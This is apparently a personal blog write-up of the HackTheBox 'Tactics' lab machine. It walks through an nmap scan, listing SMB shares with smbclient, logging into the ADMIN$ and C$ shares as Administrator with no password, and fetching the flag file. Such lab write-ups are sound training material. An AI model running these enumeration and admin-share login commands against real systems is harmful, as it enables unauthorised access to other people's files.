---
title: "HackTheBox - Tactics"
author: Nasrallah
description: ""
date: 2022-07-03 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, smb]
img_path: /assets/img/hackthebox/machines/tactics/
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Tactics](https://app.hackthebox.com/starting-point?tier=1) from [HackTheBox](https://www.hackthebox.com).

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 -Pn {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

- -Pn: Treat all hosts as online -- skip host discovery. Usually for windows targets.

```terminal
Nmap scan report for 10.129.195.131 (10.129.195.131)
Host is up (0.15s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-07-27T18:39:27
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

We have a windows machine running SMB.

### SMB

We can enumerate SMB using `smbclient`. The full command is as follows:`sudo smbclient -L 10.129.195.131`

>-L: list shares.

![](1.png)

Couldn't enumerate the share and got access denied, let's try this time as user `Administrator`. `sudo smbclient -L 10.129.195.131 -U Administrator`

![](2.png)

We found 3 shares.

- IPC$ share: is also known as a null session connection. By using this session, Windows lets anonymous users perform certain activities, such as enumerating the names of domain accounts and network shares.

The other two, ADMIN$ and C$ are disk shares so we might be able to login into them.

## **Foothold**

Let's try login to the ADMIN$ share.`sudo smbclient \\\\10.129.195.131\\ADMIN$ -U Administrator`.

![](3.png)

We managed to login without a password, but this share doesn't have much use for us. The C$ share on the other hand can be very useful since it is the file system of Windows. `sudo smbclient \\\\10.129.195.131\\C$ -U Administrator`

![](4.png)

Great! We are in the c drive, to retrieve the flag, use the following command: get Users\Administrator\Desktop\flag.txt`

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).
